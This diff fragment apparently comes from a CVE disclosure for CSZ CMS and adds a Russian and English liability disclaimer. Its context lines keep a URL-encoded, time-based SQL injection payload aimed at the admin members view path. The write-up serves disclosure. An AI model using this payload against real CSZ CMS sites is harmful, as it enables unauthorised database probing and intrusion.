@@ -34,3 +34,13 @@ to
 and url encode all characters
 
 /cszcms/admin/members/view/%27%6f%72%28%73%6c%65%65%70%28%31%30%29%29%23%20
+
+
+# Отказ от ответственности:
+
+Информация о проблемах безопасности (CVE), распространяемая здесь, предоставляется "как есть". Мы не несем ответственности за последствия ее использования. Пожалуйста, будьте осторожны и проконсультируйтесь с соответствующими специалистами перед действиями.
+
+
+# Disclaimer:
+
+The security vulnerability information (CVE) shared here is provided "as is". We do not accept responsibility for any consequences resulting from its use. Please exercise caution and consult with appropriate experts before taking action.
